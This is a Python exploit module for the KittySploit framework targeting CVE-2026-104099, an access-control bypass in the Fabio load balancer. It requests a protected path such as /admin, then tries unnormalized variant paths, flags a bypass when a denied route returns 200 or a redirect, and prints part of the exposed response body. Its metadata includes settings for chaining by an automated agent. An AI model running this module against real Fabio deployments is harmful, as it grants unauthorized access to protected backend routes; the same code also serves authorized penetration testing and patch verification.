#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-104099 — Fabio access-control path normalization bypass."""

from kittysploit import *
from lib.protocols.http.fabio import Fabio
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client, Fabio):
    __info__ = {
        "name": "Fabio CVE-2026-104099 ACL bypass",
        "description": "Reaches backend-protected routes using unnormalized request paths.",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-104099"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-104099"],
        "tags": ["fabio", "acl", "bypass", "cve-2026-104099", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["auth_bypass"],
            "chain": {"suggested_followups": ["scanner/http/fabio_cve_2026_104099_detect"]},
        },
    }

    protected_path = OptString("/admin", "Protected backend path", required=False)

    def run(self):
        protected = str(self.protected_path or "/admin")
        denied, _ = self.fabio_probe_path(protected)
        print_status(f"Direct {protected} -> HTTP {denied}")
        for path in self.fabio_bypass_paths(protected):
            code, body = self.fabio_probe_path(path)
            if denied in (401, 403, 404) and code in (200, 301, 302):
                print_success(f"Bypass via {path} -> HTTP {code}")
                print_status(body[:600])
                self.set_info(severity="critical", cve="CVE-2026-104099", path=path, status=code)
                return True
        print_error("No Fabio ACL bypass observed")
        return False